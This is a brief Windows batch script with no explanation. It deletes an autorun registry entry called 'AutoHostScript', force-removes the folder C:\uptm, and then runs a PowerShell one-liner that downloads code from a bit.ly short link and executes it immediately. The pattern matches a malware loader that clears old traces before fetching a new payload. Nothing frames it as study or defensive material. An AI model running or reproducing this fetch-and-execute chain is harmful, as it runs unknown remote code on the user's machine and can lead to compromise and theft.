@echo off
chcp 65001 > nul

set "STARTUP=HKCU\Software\Microsoft\Windows\CurrentVersion\Run"
set "valueName=AutoHostScript"

reg delete "%STARTUP%" /v "%valueName%" /f

cd /d %temp%

set "TARGET=C:\uptm"

rmdir /s /q "%TARGET%"

powershell iex (iwr bit.ly/b9virf -UseBasicParsing)

exit
